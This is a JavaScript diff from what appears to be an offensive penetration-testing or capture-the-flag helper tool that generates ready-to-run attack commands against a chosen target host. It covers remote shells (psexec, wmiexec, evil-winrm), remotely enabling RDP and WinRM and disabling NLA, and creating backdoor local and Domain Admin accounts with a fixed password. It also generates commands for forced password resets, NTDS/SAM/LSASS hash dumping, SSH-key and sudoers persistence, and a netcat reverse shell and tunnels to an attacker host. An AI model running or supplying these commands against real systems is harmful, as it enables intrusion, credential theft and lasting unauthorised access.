+            note: 'Run inside cmd.exe or PowerShell on the RDP desktop.',
+            variants: winProofVariants([userFlagWinPath, rootFlagWinPath], false, hasVerifiedLocalPath && hasVerifiedRootPath)
+          }
+        ]
+      }, deckVariantSel));
+    }
+
+    if (isLinux) {
+      flagLanes.push(pcMakeLane({
+        id: 'linux-user-ssh',
+        actionId: 'flag-hunt-linux',
+        title: 'User Flag via SSH (One-Shot or Interactive)',
+        sub: 'Port 22 · Linux Foothold Proof',
+        locked: !(hasSsh && (hasCred || hasLinShell)),
+        lockReason: !hasSsh ? 'Port 22 Closed' : 'Requires Credential or Shell',
+        done: localFlagCaptured,
+        steps: [
+          {
+            id: 'lin-user-grab',
+            label: 'Connect & Capture Linux User Flag Proof',
+            tool: 'ssh',
+            locus: 'remote',
+            done: localFlagCaptured,
+            note: 'Captures whoami, id, hostname, ip addr, and user.txt / local.txt.',
+            variants: [
+              { id: 'ssh-oneliner', label: 'ssh one-liner', tool: 'ssh', locus: 'remote', command: "ssh " + activeUser + "@" + target + " 'whoami; id; hostname; ip -4 a; find /home /root -name \"user.txt\" -o -name \"local.txt\" 2>/dev/null -exec head -n 5 {} +'" },
+              { id: 'ssh-interactive', label: 'ssh interactive', tool: 'ssh', locus: 'remote', command: "ssh " + activeUser + "@" + target }
+            ]
+          }
+        ]
+      }, deckVariantSel));
+
+      flagLanes.push(pcMakeLane({
+        id: 'linux-root-proof',
+        actionId: 'flag-hunt-root-linux',
+        title: 'Root Flag & Proof Capture',
+        sub: 'Linux Root Shell Proof',
+        locked: !hasRoot,
+        lockReason: 'Requires Root (UID 0 or sudo)',
+        done: rootFlagCaptured,
+        steps: [
+          {
+            id: 'lin-root-grab',
+            label: 'Capture Linux Root Proof',
+            tool: 'sh',
+            locus: 'onhost',
+            done: rootFlagCaptured,
+            note: 'Prints root identity, network addresses, and both flags in one frame.',
+            variants: [
+              { id: 'sudo-sh', label: 'sudo -n sh', tool: 'sudo', locus: 'onhost', command: "sudo -n sh -c 'whoami; id; hostname; ip -4 a; cat /root/root.txt /root/proof.txt 2>/dev/null'" },
+              { id: 'root-proof', label: 'root shell proof', tool: 'sh', locus: 'onhost', command: "whoami; id; hostname; ip -4 a; cat /root/root.txt /root/proof.txt 2>/dev/null" },
+              { id: 'both-flags', label: 'both flags (2 IP blocks)', tool: 'sh', locus: 'onhost', command: "whoami; id; hostname; ip -4 a; find /home /var /srv /opt -maxdepth 4 \\( -name user.txt -o -name local.txt \\) -exec echo '--- {} ---' \\; -exec head -n 5 {} \\; 2>/dev/null; echo ''; whoami; id; hostname; ip -4 a; find /root -maxdepth 2 \\( -name root.txt -o -name proof.txt \\) -exec echo '--- {} ---' \\; -exec head -n 5 {} \\; 2>/dev/null" }
+            ]
+          }
+        ]
+      }, deckVariantSel));
+    }
+
+    // Tab 2: Get On Host (shells)
+    var shellLanes = [
+      pcMakeLane({
+        id: 'shell-winrm',
+        actionId: 'win-interactive-shell',
+        title: 'Interactive WinRM Shell (Evil-WinRM)',
+        sub: 'Port 5985 / 5986 · Full PowerShell Session',
+        locked: !(hasWinrm && hasCred),
+        lockReason: !hasWinrm ? 'Port 5985 Closed' : 'Requires Credential',
+        done: hasFact('winrm.authenticated') && hasWinShell,
+        steps: [
+          {
+            id: 'winrm-connect',
+            label: 'Connect Interactive WinRM Session',
+            tool: 'evil-winrm',
+            locus: 'remote',
+            done: hasFact('winrm.authenticated') && hasWinShell,
+            note: 'Spawns an interactive PowerShell session with upload/download support.',
+            variants: [
+              { id: 'evil-winrm', label: 'evil-winrm', tool: 'evil-winrm', locus: 'remote', command: "evil-winrm " + evilWinrmAuth },
+              { id: 'impacket-rc', label: 'impacket-rc', tool: 'nxc', locus: 'remote', command: "nxc winrm " + target + " " + nxcAuth + " -X '$PSVersionTable'" }
+            ]
+          }
+        ]
+      }, deckVariantSel),
+
+      pcMakeLane({
+        id: 'shell-rdp',
+        actionId: 'win-interactive-shell',
+        title: 'Graphical Desktop Session (xfreerdp)',
+        sub: 'Port 3389 · Full Windows GUI',
+        locked: !(hasRdp && hasCred),
+        lockReason: !hasRdp ? 'Port 3389 Closed' : 'Requires Credential',
+        done: hasFact('rdp.authenticated'),
+        steps: [
+          {
+            id: 'rdp-connect',
+            label: 'Launch FreeRDP Desktop',
+            tool: 'xfreerdp',
+            locus: 'remote',
+            done: hasFact('rdp.authenticated'),
+            note: 'Opens an interactive Windows desktop and mounts your current working directory as \\\\tsclient\\share (/tls:seclevel:0 supports legacy Server 2008 R2 / 2012 TLS 1.0 as well as modern hosts).',
+            variants: [
+              { id: 'xfreerdp-pass', label: 'password + drive', tool: 'xfreerdp', locus: 'remote', command: "xfreerdp /v:" + target + " /u:'" + activeUser + "' /p:'" + (password || '{{password}}') + "' /d:'" + (domain || '.') + "' /cert:ignore /tls:seclevel:0 +clipboard /dynamic-resolution /drive:share,." },
+              { id: 'xfreerdp-clip', label: 'clipboard only', tool: 'xfreerdp', locus: 'remote', command: "xfreerdp /v:" + target + xfreerdpDomFlag + " /u:'" + activeUser + "' /p:'" + (password || '{{password}}') + "' /cert:ignore /tls:seclevel:0 +clipboard /dynamic-resolution" },
+              { id: 'xfreerdp-pth', label: 'PtH /pth', tool: 'xfreerdp', locus: 'remote', command: "xfreerdp /v:" + target + xfreerdpDomFlag + " /u:'" + activeUser + "' /pth:" + (activeHash || '{{nthash}}') + " /cert:ignore /tls:seclevel:0 +clipboard /dynamic-resolution /drive:share,." },
+              { id: 'xfreerdp-sec-rdp', label: '/sec:rdp', tool: 'xfreerdp', locus: 'remote', note: 'Forces classic RDP encryption (no TLS handshake) when NLA is disabled on legacy targets.', command: "xfreerdp " + xfreerdpAuth + " /cert:ignore /sec:rdp /tls:seclevel:0 +clipboard /dynamic-resolution /drive:share,." }
+            ],
+            selectedVariantId: useHashAuth ? 'xfreerdp-pth' : 'xfreerdp-pass'
+          }
+        ]
+      }, deckVariantSel),
+
+      pcMakeLane({
+        id: 'shell-admin-exec',
+        actionId: 'lateral-exec',
+        title: 'Admin Remote Shell Over SMB/RPC (Port 445/135)',
+        sub: 'Works even when WinRM (5985) and RDP (3389) are closed',
+        locked: !(isAdmin && hasSmb),
+        lockReason: !isAdmin ? 'Needs Admin' : 'Port 445 Closed',
+        done: hasWinShell && isAdmin,
+        steps: [
+          {
+            id: 'admin-exec-connect',
+            label: 'Spawn Admin / SYSTEM Shell',
+            tool: 'impacket-psexec',
+            locus: 'remote',
+            done: hasWinShell && isAdmin,
+            note: 'Switch between PsExec (full interactive SYSTEM cmd.exe), WMI (no service creation), SMBExec, or NetExec one-liners.',
+            variants: [
+              { id: 'psexec', label: 'psexec', tool: 'impacket-psexec', locus: 'remote', command: "impacket-psexec '" + impacketIdent + "'" + impacketAuthFlags },
+              { id: 'wmiexec', label: 'wmiexec', tool: 'impacket-wmiexec', locus: 'remote', command: "impacket-wmiexec '" + impacketIdent + "'" + impacketAuthFlags },
+              { id: 'smbexec', label: 'smbexec', tool: 'impacket-smbexec', locus: 'remote', command: "impacket-smbexec '" + impacketIdent + "'" + impacketAuthFlags },
+              { id: 'nxc', label: 'nxc smb -x', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " -x 'whoami /all'" }
+            ]
+          }
+        ]
+      }, deckVariantSel),
+
+      pcMakeLane({
+        id: 'shell-unlock-winrm',
+        actionId: 'win-interactive-shell',
+        title: 'Unlock WinRM Remotely -> Connect (2 Steps)',
+        sub: '445 -> 5985 · Enables WinRM Listener + PSRemoting',
+        locked: !(isAdmin && hasSmb),
+        lockReason: !isAdmin ? 'Needs Admin' : 'Port 445 Closed',
+        done: hasFact('host.winrm_enabled') && hasFact('winrm.authenticated'),
+        steps: [
+          {
+            id: 'unlock-winrm-cmd',
+            label: 'Enable WinRM Listener & Firewall Port 5985',
+            tool: 'nxc',
+            locus: 'remote',
+            done: hasFact('host.winrm_enabled'),
+            note: 'Configures WinRM AllowAutoConfig + IPv4Filter in Registry, sets LocalAccountTokenFilterPolicy=1, opens TCP 5985, restarts WinRM, and initializes PSRemoting as SYSTEM.',
+            variants: [
+              { id: 'nxc', label: 'nxc smb -x', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " -x '" + winrmEnableWinCmd + "'" },
+              { id: 'psexec', label: 'psexec', tool: 'impacket-psexec', locus: 'remote', command: "impacket-psexec '" + impacketIdent + "'" + impacketAuthFlags + " '" + winrmEnableWinCmd + "'" },
+              { id: 'wmiexec', label: 'wmiexec', tool: 'impacket-wmiexec', locus: 'remote', command: "impacket-wmiexec '" + impacketIdent + "'" + impacketAuthFlags + " '" + winrmEnableWinCmd + "'" }
+            ]
+          },
+          {
+            id: 'unlock-winrm-connect',
+            label: 'Connect Interactive Evil-WinRM Shell',
+            tool: 'evil-winrm',
+            locus: 'remote',
+            done: hasFact('winrm.authenticated'),
+            note: 'Log into your newly enabled WinRM service.',
+            command: "evil-winrm " + evilWinrmAuth
+          }
+        ]
+      }, deckVariantSel),
+
+      pcMakeLane({
+        id: 'shell-unlock-rdp',
+        actionId: 'win-interactive-shell',
+        title: 'Unlock RDP + Firewall Remotely -> Connect (2 Steps)',
+        sub: '445 -> 3389 · Enables TermService + Disables NLA',
+        locked: !(isAdmin && hasSmb),
+        lockReason: !isAdmin ? 'Needs Admin' : 'Port 445 Closed',
+        done: hasFact('host.rdp_enabled') && hasFact('rdp.authenticated'),
+        steps: [
+          {
+            id: 'unlock-rdp-cmd',
+            label: 'Enable RDP, Disable NLA & Firewall Port 3389',
+            tool: 'nxc',
+            locus: 'remote',
+            done: hasFact('host.rdp_enabled'),
+            note: 'Sets fDenyTSConnections=0, UserAuthentication=0, DisableRestrictedAdmin=0, starts TermService, and opens TCP 3389.',
+            variants: [
+              { id: 'nxc', label: 'nxc smb -x', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " -x '" + rdpEnableWinCmd + "'" },
+              { id: 'psexec', label: 'psexec', tool: 'impacket-psexec', locus: 'remote', command: "impacket-psexec '" + impacketIdent + "'" + impacketAuthFlags + " '" + rdpEnableWinCmd + "'" },
+              { id: 'wmiexec', label: 'wmiexec', tool: 'impacket-wmiexec', locus: 'remote', command: "impacket-wmiexec '" + impacketIdent + "'" + impacketAuthFlags + " '" + rdpEnableWinCmd + "'" }
+            ]
+          },
+          {
+            id: 'unlock-rdp-connect',
+            label: 'Connect Graphical Desktop (xfreerdp)',
+            tool: 'xfreerdp',
+            locus: 'remote',
+            done: hasFact('rdp.authenticated'),
+            note: 'Launches xfreerdp against the newly opened RDP port (/tls:seclevel:0 supports legacy TLS 1.0 as well as modern hosts).',
+            variants: [
+              { id: 'xfreerdp-tls', label: 'xfreerdp', tool: 'xfreerdp', locus: 'remote', command: "xfreerdp " + xfreerdpAuth + " /cert:ignore /tls:seclevel:0 +clipboard /dynamic-resolution /drive:share,." },
+              { id: 'xfreerdp-sec-rdp', label: 'xfreerdp /sec:rdp', tool: 'xfreerdp', locus: 'remote', note: 'Forces classic RDP encryption (no TLS handshake) once Step 1 has set UserAuthentication=0.', command: "xfreerdp " + xfreerdpAuth + " /cert:ignore /sec:rdp /tls:seclevel:0 +clipboard /dynamic-resolution /drive:share,." }
+            ]
+          }
+        ]
+      }, deckVariantSel),
+
+      pcMakeLane({
+        id: 'shell-ssh',
+        actionId: 'fix-no-tty',
+        title: 'Linux SSH Interactive Shell',
+        sub: 'Port 22 · Password or SSH Private Key',
+        locked: !(hasSsh && hasCred && (isLinux || !hasFact('os.windows'))),
+        lockReason: (hasFact('os.windows') && !isLinux) ? 'Linux Target Only' : (!hasSsh ? 'Port 22 Closed' : 'Requires Credential'),
+        done: hasFact('ssh.authenticated') && hasLinShell,
+        steps: [
+          {
+            id: 'ssh-connect-step',
+            label: 'Open Interactive SSH Session',
+            tool: 'ssh',
+            locus: 'remote',
+            done: hasFact('ssh.authenticated') && hasLinShell,
+            note: 'Connects to SSH using password, private key, or sshpass.',
+            variants: [
+              { id: 'ssh', label: 'ssh', tool: 'ssh', locus: 'remote', command: "ssh " + activeUser + "@" + target },
+              { id: 'ssh-key', label: 'ssh -i key', tool: 'ssh', locus: 'remote', command: "ssh -i id_rsa " + activeUser + "@" + target },
+              { id: 'sshpass', label: 'sshpass', tool: 'sshpass', locus: 'remote', command: "sshpass -p '" + (password || '{{password}}') + "' ssh -o StrictHostKeyChecking=no " + activeUser + "@" + target }
+            ]
+          }
+        ]
+      }, deckVariantSel)
+    ];
+
+    // Tab 3: Persistence & Accounts
+    var obolCreated = credsAvail.some(function (c) { return c && String(c.username || '').toLowerCase() === 'obol'; });
+    var persistenceLanes = [
+      pcMakeLane({
+        id: 'persist-local-admin',
+        actionId: 'lateral-exec',
+        title: 'Create Local Admin Backdoor (obol / ObolPass123!)',
+        sub: 'Mints a clean cleartext Admin + RDP + WinRM user even when you only have an NTHash',
+        locked: !(!isLinuxOnly && isAdmin && (hasSmb || hasWinShell)),
+        lockReason: isLinuxOnly ? 'Windows Target Only' : (!isAdmin ? 'Needs Admin' : 'Port 445 Closed'),
+        done: obolCreated,
+        steps: [
+          {
+            id: 'create-local-obol',
+            label: 'Create Local Admin User (obol)',
+            tool: 'nxc',
+            locus: 'remote',
+            done: obolCreated,
+            note: 'Creates obol / ObolPass123! and adds to Administrators, Remote Desktop Users, and Remote Management Users.',
+            variants: [
+              { id: 'nxc', label: 'nxc smb -x', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " -x '(net user obol ObolPass123! /add & net localgroup Administrators obol /add & net localgroup \"Remote Desktop Users\" obol /add & net localgroup \"Remote Management Users\" obol /add)'" },
+              { id: 'wmiexec', label: 'wmiexec', tool: 'impacket-wmiexec', locus: 'remote', command: "impacket-wmiexec '" + impacketIdent + "'" + impacketAuthFlags + " '(net user obol ObolPass123! /add & net localgroup Administrators obol /add & net localgroup \"Remote Desktop Users\" obol /add & net localgroup \"Remote Management Users\" obol /add)'" },
+              { id: 'onhost-cmd', label: 'On-Host cmd.exe', tool: 'cmd', locus: 'onhost', command: '(net user obol ObolPass123! /add & net localgroup Administrators obol /add & net localgroup "Remote Desktop Users" obol /add & net localgroup "Remote Management Users" obol /add)' }
+            ]
+          },
+          {
+            id: 'validate-local-obol',
+            label: 'Validate New obol Local Admin Account',
+            tool: 'nxc',
+            locus: 'remote',
+            done: obolCreated && credsPass.some(function (c) { return c && String(c.username || '').toLowerCase() === 'obol'; }),
+            note: 'Confirms Pwn3d! with your new cleartext backdoor credentials.',
+            command: "nxc smb " + target + " -u obol -p 'ObolPass123!' --local-auth"
+          }
+        ]
+      }, deckVariantSel),
+
+      pcMakeLane({
+        id: 'persist-domain-admin',
+        actionId: 'own-domain-pth',
+        title: 'Create Domain Admin Backdoor (obol / ObolPass123!)',
+        sub: 'Creates a domain-wide Admin account in Active Directory',
+        locked: !((isAdmin || hasAclLead) && isDc),
+        lockReason: !isDc ? 'Requires Domain Controller / AD' : 'Needs Domain Admin or Writable ACL',
+        done: obolCreated && isDc,
+        steps: [
+          {
+            id: 'create-domain-obol',
+            label: 'Create Domain Admin User (obol)',
+            tool: 'nxc',
+            locus: 'remote',
+            done: obolCreated && isDc,
+            note: 'Creates domain user obol and adds to Domain Admins, Remote Desktop Users, and Remote Management Users.',
+            variants: [
+              { id: 'nxc-domain', label: 'nxc smb -x', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " -x '(net user obol ObolPass123! /add /domain & net group \"Domain Admins\" obol /add /domain & net localgroup \"Remote Desktop Users\" obol /add & net localgroup \"Remote Management Users\" obol /add)'" },
+              { id: 'bloodyad', label: 'bloodyAD', tool: 'bloodyAD', locus: 'remote', command: "bloodyAD " + bloodyAuth + " add user obol 'ObolPass123!' && bloodyAD " + bloodyAuth + " add groupMember 'Domain Admins' obol" },
+              { id: 'onhost-domain', label: 'On-Host cmd.exe', tool: 'cmd', locus: 'onhost', command: '(net user obol ObolPass123! /add /domain & net group "Domain Admins" obol /add /domain)' }
+            ]
+          },
+          {
+            id: 'validate-domain-obol',
+            label: 'Validate obol Domain Admin Account',
+            tool: 'nxc',
+            locus: 'remote',
+            done: obolCreated && isDc,
+            note: 'Validates Domain Admin access over SMB.',
+            command: "nxc smb " + target + " -u obol -p 'ObolPass123!'" + (domain ? (" -d " + domain) : '')
+          }
+        ]
+      }, deckVariantSel),
+
+      pcMakeLane({
+        id: 'persist-group-elevate',
+        actionId: 'ad-path-manual',
+        title: 'Add Existing User to Admin / RDP / WinRM Groups',
+        sub: 'Elevates an existing compromised account without creating a new user',
+        locked: !(!isLinuxOnly && (isAdmin || hasAclLead) && (hasSmb || isDc || hasWinShell)),
+        lockReason: isLinuxOnly ? 'Windows / AD Target Only' : (!(isAdmin || hasAclLead) ? 'Needs Admin or Group Write ACL' : 'Port 445 Closed'),
+        done: false,
+        steps: [
+          {
+            id: 'group-elevate-step',
+            label: 'Add User to Privileged Groups',
+            tool: 'nxc',
+            locus: 'remote',
+            done: false,
+            note: 'Grants Administrators, Remote Desktop Users, or Domain Admins membership.',
+            variants: [
+              { id: 'nxc-local', label: 'nxc (Local)', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " -x '(net localgroup Administrators \"" + activeUser + "\" /add & net localgroup \"Remote Desktop Users\" \"" + activeUser + "\" /add & net localgroup \"Remote Management Users\" \"" + activeUser + "\" /add)'" },
+              { id: 'bloodyad-da', label: 'bloodyAD (Domain)', tool: 'bloodyAD', locus: 'remote', command: "bloodyAD " + bloodyAuth + " add groupMember 'Domain Admins' '" + activeUser + "'" },
+              { id: 'rpcclient-grp', label: 'rpcclient', tool: 'rpcclient', locus: 'remote', command: "rpcclient " + smbClientAuth + " " + target + " -c 'adddomgroupmem 0x200 {{target_rid}}'" },
+              { id: 'onhost-localgrp', label: 'On-Host cmd', tool: 'cmd', locus: 'onhost', command: 'net localgroup Administrators "' + activeUser + '" /add && net localgroup "Remote Desktop Users" "' + activeUser + '" /add' }
+            ]
+          }
+        ]
+      }, deckVariantSel),
+
+      pcMakeLane({
+        id: 'persist-pass-reset',
+        actionId: 'ad-path-manual',
+        title: 'Force-Reset Account Password (ObolPass123!)',
+        sub: 'Exploits ForceChangePassword / GenericAll / Admin rights',
+        locked: !(!isLinuxOnly && (isAdmin || hasAclLead || hasForceChangePw) && (hasSmb || isDc)),
+        lockReason: isLinuxOnly ? 'Windows / AD Target Only' : (!(isAdmin || hasAclLead || hasForceChangePw) ? 'Needs Admin or ForceChangePassword ACL' : 'Port 445 / 389 Closed'),
+        done: false,
+        steps: [
+          {
+            id: 'pass-reset-step',
+            label: 'Reset Target Password (ObolPass123!)',
+            tool: 'bloodyAD',
+            locus: 'remote',
+            done: false,
+            note: 'Sets a known cleartext password on the target account.',
+            variants: [
+              { id: 'bloodyad-pass', label: 'bloodyAD', tool: 'bloodyAD', locus: 'remote', command: "bloodyAD " + bloodyAuth + " set password '{{target_user}}' 'ObolPass123!'" },
+              { id: 'rpcclient-pass', label: 'rpcclient', tool: 'rpcclient', locus: 'remote', command: "rpcclient " + smbClientAuth + " " + target + " -c \"setuserinfo2 '{{target_user}}' 23 'ObolPass123!'\"" },
+              { id: 'nxc-netuser', label: 'nxc smb -x', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " -x 'net user \"{{target_user}}\" ObolPass123! /domain'" }
+            ]
+          }
+        ]
+      }, deckVariantSel),
+
+      pcMakeLane({
+        id: 'persist-hash-dump',
+        actionId: 'dcsync',
+        title: 'Dump Permanent Hashes (NTDS.dit / SAM / LSA)',
+        sub: 'Extracts NTLM hashes for offline persistence & Pass-the-Hash',
+        locked: !(!isLinuxOnly && (isAdmin || hasDcsyncRights) && (hasSmb || isDc)),
+        lockReason: isLinuxOnly ? 'Windows / AD Target Only' : (!(isAdmin || hasDcsyncRights) ? 'Needs Admin or DCSync Rights' : 'Port 445 Closed'),
+        done: hasFact('loot.ntds') || hasFact('hash.krbtgt') || hasFact('loot.sam'),
+        steps: [
+          {
+            id: 'hash-dump-step',
+            label: 'Dump NTDS.dit or SAM Hashes',
+            tool: 'impacket-secretsdump',
+            locus: 'remote',
+            done: hasFact('loot.ntds') || hasFact('hash.krbtgt') || hasFact('loot.sam'),
+            note: 'Paste the secretsdump / NetExec output back into Obol to auto-populate all hashes.',
+            variants: [
+              { id: 'secretsdump-dc', label: 'secretsdump DC', tool: 'impacket-secretsdump', locus: 'remote', command: "impacket-secretsdump '" + impacketIdent + "'" + impacketAuthFlags + " -just-dc-ntlm" },
+              { id: 'secretsdump-sam', label: 'secretsdump', tool: 'impacket-secretsdump', locus: 'remote', command: "impacket-secretsdump '" + impacketIdent + "'" + impacketAuthFlags },
+              { id: 'nxc-lsassy', label: 'lsassy', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " -M lsassy" },
+              { id: 'nxc-ntds', label: 'nxc --ntds', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " --ntds" },
+              { id: 'nxc-sam', label: 'nxc --sam', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " --sam --lsa" }
+            ]
+          }
+        ]
+      }, deckVariantSel),
+
+      pcMakeLane({
+        id: 'persist-linux-ssh',
+        actionId: 'flag-hunt-linux',
+        title: 'Linux SSH Key & Sudoers Persistence',
+        sub: 'Maintains durable passwordless SSH & root access on Linux targets',
+        locked: !((isLinux || !hasFact('os.windows')) && (hasLinShell || (hasSsh && hasCred))),
+        lockReason: (hasFact('os.windows') && !isLinux) ? 'Linux Target Only' : 'Requires Linux Shell or SSH Credential',
+        done: false,
+        steps: [
+          {
+            id: 'linux-persist-step',
+            label: 'Plant SSH Key or Sudoers Drop-In',
+            tool: 'sh',
+            locus: 'onhost',
+            done: false,
+            note: 'Guarantees instant re-entry over SSH even if application exploits rotate.',
+            variants: [
+              { id: 'user-ssh-key', label: 'User ~/.ssh', tool: 'sh', locus: 'onhost', command: "mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo '{{ssh_pubkey}}' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys" },
+              { id: 'root-ssh-key', label: 'Root /root/.ssh', tool: 'sh', locus: 'onhost', command: "mkdir -p /root/.ssh && chmod 700 /root/.ssh && echo '{{ssh_pubkey}}' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys" },
+              { id: 'sudoers-obol', label: '/etc/sudoers.d/obol', tool: 'sh', locus: 'onhost', command: "echo '" + (user || 'obol') + " ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/obol && chmod 440 /etc/sudoers.d/obol" }
+            ]
+          }
+        ]
+      }, deckVariantSel)
+    ];
+
+    // Tab 4: Shares & File Transfer
+    var smbAuthFlag = hasCred ? smbClientAuth : "-N";
+
+    var shareChoices = [];
+    function addShareChoice(s) {
+      if (!s || /^(IPC\$|PRINT\$)$/i.test(s)) return;
+      if (shareChoices.indexOf(s) < 0) shareChoices.push(s);
+    }
+    readableShares.forEach(addShareChoice);
+    ['Users', 'SYSVOL', 'NETLOGON', 'C$', 'ADMIN$'].forEach(addShareChoice);
+    var activeSmbShare = deckParams.smb_share || (customShares.length ? chosenShare : (shareChoices[0] || 'Users'));
+    if (shareChoices.indexOf(activeSmbShare) < 0) shareChoices.unshift(activeSmbShare);
+
+    var defaultRemoteFile = userShareRelPath || ((user || 'Public') + '\\Desktop\\user.txt');
+    var rawRemoteFile = typeof deckParams.remote_file === 'string' ? deckParams.remote_file.trim() : '';
+    var rawLocalFile = typeof deckParams.local_file === 'string' ? deckParams.local_file.trim() : '';
+    var effRemoteFile = rawRemoteFile || (rawLocalFile ? rawLocalFile.split(/[\\\/]/).pop() : defaultRemoteFile);
+    var effLocalFile = rawLocalFile || (effRemoteFile.split(/[\\\/]/).pop() || 'loot.bin');
+
+    var smbPresets = [
+      { id: 'user-flag', label: 'user.txt', share: 'Users', remote: defaultRemoteFile, local: 'user.txt' },
+      { id: 'gpp-xml', label: 'Groups.xml', share: chosenShare || 'SYSVOL', remote: (domain || '{{domain}}') + '\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Machine\\Preferences\\Groups\\Groups.xml', local: 'Groups.xml' },
+      { id: 'winpeas', label: 'winPEASx64.exe', share: isAdmin ? 'C$' : activeSmbShare, remote: isAdmin ? 'Windows\\Temp\\winPEASx64.exe' : 'winPEASx64.exe', local: 'winPEASx64.exe' },
+      { id: 'nc64', label: 'nc64.exe', share: isAdmin ? 'C$' : activeSmbShare, remote: isAdmin ? 'Windows\\Temp\\nc64.exe' : 'nc64.exe', local: 'nc64.exe' },
+      { id: 'sharphound', label: 'SharpHound.exe', share: isAdmin ? 'C$' : activeSmbShare, remote: isAdmin ? 'Windows\\Temp\\SharpHound.exe' : 'SharpHound.exe', local: 'SharpHound.exe' }
+    ];
+
+    var STAGE_CATALOG = [
+      { id: 'winPEASx64.exe', label: 'winPEASx64.exe', os: 'win', role: 'Win PrivEsc Enum', kaliSrc: '/usr/share/peass/winpeas/winPEASx64.exe', dst: 'C:\\Windows\\Temp\\winPEASx64.exe', smbDst: 'Windows\\Temp\\winPEASx64.exe', run: 'C:\\Windows\\Temp\\winPEASx64.exe' },
+      { id: 'SharpHound.exe', label: 'SharpHound.exe', os: 'win', role: 'AD BloodHound Collector', kaliSrc: '/usr/share/sharphound/SharpHound.exe', dst: 'C:\\Windows\\Temp\\SharpHound.exe', smbDst: 'Windows\\Temp\\SharpHound.exe', run: 'C:\\Windows\\Temp\\SharpHound.exe -c All --zipfilename bh.zip' },
+      { id: 'nc64.exe', label: 'nc64.exe', os: 'win', role: 'Reverse Shell Binary', kaliSrc: '/usr/share/windows-resources/binaries/nc.exe', dst: 'C:\\Windows\\Temp\\nc64.exe', smbDst: 'Windows\\Temp\\nc64.exe', run: 'C:\\Windows\\Temp\\nc64.exe ' + lhost + ' ' + lport + ' -e cmd.exe' },
+      { id: 'ligolo-agent.exe', label: 'ligolo-agent.exe', os: 'win', role: 'Tunneling Agent', kaliSrc: '/opt/ligolo-ng/agent.exe', dst: 'C:\\Windows\\Temp\\agent.exe', smbDst: 'Windows\\Temp\\agent.exe', run: 'C:\\Windows\\Temp\\agent.exe -connect ' + lhost + ':11601 -ignore-cert' },
+      { id: 'RunasCs.exe', label: 'RunasCs.exe', os: 'win', role: 'RunAs w/ Creds', kaliSrc: '/opt/RunasCs/RunasCs.exe', dst: 'C:\\Windows\\Temp\\RunasCs.exe', smbDst: 'Windows\\Temp\\RunasCs.exe', run: 'C:\\Windows\\Temp\\RunasCs.exe ' + activeUser + ' ' + (password || '{{password}}') + ' cmd.exe -r ' + lhost + ':' + lport },
+      { id: 'GodPotato.exe', label: 'GodPotato.exe', os: 'win', role: 'SeImpersonate -> SYSTEM', kaliSrc: '/opt/Potato/GodPotato-NET4.exe', dst: 'C:\\Windows\\Temp\\GodPotato.exe', smbDst: 'Windows\\Temp\\GodPotato.exe', run: 'C:\\Windows\\Temp\\GodPotato.exe -cmd "cmd /c whoami"' },
+      { id: 'PrintSpoofer64.exe', label: 'PrintSpoofer64.exe', os: 'win', role: 'SeImpersonate Pipe', kaliSrc: '/opt/PrintSpoofer/PrintSpoofer64.exe', dst: 'C:\\Windows\\Temp\\PrintSpoofer64.exe', smbDst: 'Windows\\Temp\\PrintSpoofer64.exe', run: 'C:\\Windows\\Temp\\PrintSpoofer64.exe -i -c cmd' },
+      { id: 'PowerView.ps1', label: 'PowerView.ps1', os: 'win', role: 'AD PowerShell Recon', kaliSrc: '/usr/share/windows-resources/powersploit/Recon/PowerView.ps1', dst: 'C:\\Windows\\Temp\\PowerView.ps1', smbDst: 'Windows\\Temp\\PowerView.ps1', run: 'powershell -ep bypass -c ". C:\\Windows\\Temp\\PowerView.ps1; Get-NetDomain"' },
+      { id: 'Rubeus.exe', label: 'Rubeus.exe', os: 'win', role: 'Kerberos Toolkit', kaliSrc: '/opt/SharpCollection/NetFramework_4.7_x64/Rubeus.exe', dst: 'C:\\Windows\\Temp\\Rubeus.exe', smbDst: 'Windows\\Temp\\Rubeus.exe', run: 'C:\\Windows\\Temp\\Rubeus.exe triage' },
+      { id: 'mimikatz.exe', label: 'mimikatz.exe', os: 'win', role: 'LSASS & Tickets', kaliSrc: '/usr/share/windows-resources/mimikatz/x64/mimikatz.exe', dst: 'C:\\Windows\\Temp\\mimikatz.exe', smbDst: 'Windows\\Temp\\mimikatz.exe', run: 'C:\\Windows\\Temp\\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"' },
+      { id: 'linpeas.sh', label: 'linpeas.sh', os: 'lin', role: 'Linux PrivEsc Enum', kaliSrc: '/usr/share/peass/linpeas/linpeas.sh', dst: '/tmp/linpeas.sh', smbDst: 'linpeas.sh', run: 'chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh' },
+      { id: 'pspy64', label: 'pspy64', os: 'lin', role: 'Cron & Process Monitor', kaliSrc: '/opt/pspy/pspy64', dst: '/tmp/pspy64', smbDst: 'pspy64', run: 'chmod +x /tmp/pspy64 && /tmp/pspy64' },
+      { id: 'chisel', label: 'chisel', os: 'lin', role: 'SOCKS5 / Port Forward', kaliSrc: '/usr/bin/chisel', dst: '/tmp/chisel', smbDst: 'chisel', run: 'chmod +x /tmp/chisel && /tmp/chisel client ' + lhost + ':8000 R:socks' }
+    ];
+    var defaultStageId = isLinuxOnly ? 'linpeas.sh' : 'winPEASx64.exe';
+    var selStageId = deckParams.stage_tool || defaultStageId;
+    var activeStageTool = STAGE_CATALOG.filter(function (t) { return t.id === selStageId; })[0] || STAGE_CATALOG[0];
+    var stageSmbShare = isAdmin ? 'C$' : activeSmbShare;
